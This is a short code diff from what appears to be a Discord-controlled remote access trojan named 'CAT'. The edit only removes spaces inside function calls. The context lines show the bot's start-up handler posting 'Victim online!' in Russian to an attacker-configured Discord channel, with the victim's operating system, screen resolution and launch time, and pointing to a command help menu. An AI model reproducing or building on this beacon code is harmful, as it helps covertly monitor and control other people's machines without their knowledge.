@@ -19,8 +19,8 @@ bot.remove_command('help')
 @bot.event
 async def on_ready():
     channel = bot.get_channel(config.channel)
-    date = datetime.now( )
-    x, y = pg.size( )
+    date = datetime.now()
+    x, y = pg.size()
     await channel.send(
         f'CAT: **Жертва онлайн!** \n Время запука **{date.hour}:{date.minute}**. \n ОС: **{sys.platform}**. \n Разрешение экрана: **{x}x{y}** \n Напишите **/help** для справки!')
     await bot.change_presence(activity=discord.Game(f'Был звпущен в {date.hour}:{date.minute}'))
